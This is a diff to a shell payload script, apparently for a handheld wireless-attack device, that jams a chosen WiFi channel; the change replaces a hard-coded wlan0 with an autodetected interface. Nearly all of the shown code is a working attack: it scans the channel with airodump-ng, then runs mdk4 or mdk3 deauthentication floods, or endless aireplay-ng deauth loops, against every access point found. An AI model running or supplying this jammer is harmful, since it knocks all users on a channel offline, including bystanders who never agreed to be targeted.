@@ -4,6 +4,11 @@
 # Description: Jam a specific WiFi channel with deauth floods
 # Category: nullsec/attack
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 PROMPT "CHANNEL JAMMER
 
 Disrupt all WiFi activity
@@ -14,8 +19,6 @@ ALL networks on target
 channel.
 
 Press OK to configure."
-
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
 
 PROMPT "SELECT CHANNEL:
 
@@ -47,11 +50,11 @@ Press OK to jam.")
 LOG "Jamming channel $CHANNEL..."
 
 # Lock to channel
-iwconfig wlan0 channel $CHANNEL
+iwconfig $IFACE channel $CHANNEL
 
 # Find all APs on channel
 SPINNER_START "Finding targets..."
-timeout 5 airodump-ng wlan0 -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
+timeout 5 airodump-ng $IFACE -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
 SPINNER_STOP
 
 # Extract BSSIDs
@@ -63,15 +66,15 @@ LOG "Found $TARGET_COUNT APs"
 
 # Start deauth flood on all targets
 if command -v mdk4 >/dev/null 2>&1; then
-    mdk4 wlan0 d -c $CHANNEL &
+    mdk4 $IFACE d -c $CHANNEL &
     JAM_PID=$!
 elif command -v mdk3 >/dev/null 2>&1; then
-    mdk3 wlan0 d -c $CHANNEL &
+    mdk3 $IFACE d -c $CHANNEL &
     JAM_PID=$!
 else
     # Fallback to aireplay
     while read BSSID; do
-        aireplay-ng -0 0 -a "$BSSID" wlan0 2>/dev/null &
+        aireplay-ng -0 0 -a "$BSSID" $IFACE 2>/dev/null &
     done < /tmp/jam_targets.txt
 fi
 
